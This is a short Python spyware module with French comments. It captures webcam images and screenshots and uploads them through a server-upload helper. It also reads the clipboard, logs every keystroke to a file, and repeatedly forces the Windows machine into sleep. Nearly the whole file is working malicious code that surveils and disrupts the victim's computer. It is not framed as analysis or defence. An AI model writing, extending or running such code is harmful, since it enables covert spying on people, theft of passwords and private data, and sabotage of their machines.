import main

start_time = main.time.time()

# Initialisation de la webcam
def webcam():
    # Créer le dossier si nécessaire
    main.os.makedirs(main.destination_folder, exist_ok=True)
    camera = main.cv2.VideoCapture(0)
    if not camera.isOpened():
        print("Erreur: Impossible d'accéder à la webcam.")
    else:
        # Capturer une image
        ret, frame = camera.read()
        if ret:
            # Enregistrer l'image capturée dans un fichier
            timestamp = int(main.time.time())  # Utilise un timestamp pour nommer les fichiers de manière unique
            filename = f"image_capturee_{timestamp}.png"
            main.cv2.imwrite(filename, frame)
            print(f"Image capturée et sauvegardée sous '{filename}'")
            
        else:
            print("Erreur: Impossible de capturer une image.")

    # Libération de la caméra
    camera.release()
    main.uploadServer(filename)

def get_clipboard_content():
    """Recupere le contenu du presse-papiers"""
    root = main.tk.Tk()
    root.withdraw()  # Cache la fenêtre principale
    clipboard_content = root.clipboard_get()  # Récupère le contenu du presse-papiers
    root.destroy()  # Ferme la fenêtre Tkinter
    return clipboard_content

def on_press(key):
    # Fonction pour enregistrer chaque frappe
    try:
        # Écrire la touche pressée dans le fichier
        with open(main.fichier_log, "a") as fichier:
            fichier.write(f"{key.char}")  # Les lettres alphanumériques
    except AttributeError:
        # Écrire la touche spéciale (ex: Espace, Entrée)
        with open(main.fichier_log, "a") as fichier:
            fichier.write(f" [{key}] ")


def mise_en_veille_toutes_les_1_minutes():
    while True:
        # Mettre le PC en veille
        main.os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        
        # Attendre 2 minutes avant la prochaine mise en veille
        main.time.sleep(60)

def capture_ecran():
    # S'assurer que le dossier existe, sinon le créer
    if not main.os.path.exists(main.destination_folder):
        main.os.makedirs(main.destination_folder)

    # Générer un nom de fichier unique avec l'heure actuelle
    nom_fichier = main.datetime.now().strftime("capture_%Y-%m-%d_%H-%M-%S.png")
    chemin_fichier = main.os.path.join(main.destination_folder, nom_fichier)
    
    # Prendre la capture d'écran
    screenshot = main.pyautogui.screenshot()
    
    # Enregistrer la capture d'écran dans le dossier spécifié
    screenshot.save(chemin_fichier)
    print(f"Capture d'écran enregistrée sous : {chemin_fichier}")
    print(nom_fichier)
    main.uploadServer(nom_fichier)
  
def Main():
    while main.time.time() - start_time < 120:
        get_clipboard_content()
        capture_ecran()



if __name__ == "__main__":
    Main()